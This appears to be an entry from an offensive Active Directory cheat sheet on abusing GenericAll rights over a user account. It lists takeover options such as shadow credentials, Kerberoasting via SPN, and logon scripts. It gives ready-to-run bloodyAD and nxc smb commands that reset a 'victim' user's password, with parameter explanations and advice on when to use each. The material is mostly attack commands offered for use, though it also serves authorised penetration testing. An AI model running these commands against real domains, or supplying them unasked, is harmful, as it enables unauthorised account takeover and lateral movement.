GenericAll on USER - Full Control

Complete control over target user. Reset password, add shadow credentials, set SPN for Kerberoasting, modify UAC, set logon script, or write any attribute.

🥇bloodyAD set passwordv2.0+
bloodyAD --host {DC_IP} -d {DOMAIN} -u {USERNAME} -p '{PASSWORD}' set password {TARGET_USER} {NEW_PASSWORD}

--host {DC_IP}: Domain Controller IP for LDAP connection

-d {DOMAIN}: Active Directory DNS domain name

-u/-p: Your authenticated credentials

set password: bloodyAD action to reset user password

{TARGET_USER}: samAccountName of victim user

{NEW_PASSWORD}: New password (must meet domain policy, 15+ chars recommended)

When to use: Primary path when you have cleartext credentials and LDAP is accessible. Fastest and most reliable.

🥈nxc smb --smbpasswdv1.0+
nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --smbpasswd {TARGET_USER} {NEW_PASSWORD}

When to use: When you want to test the password change and verify SMB access simultaneously. Also works for bulk password changes.
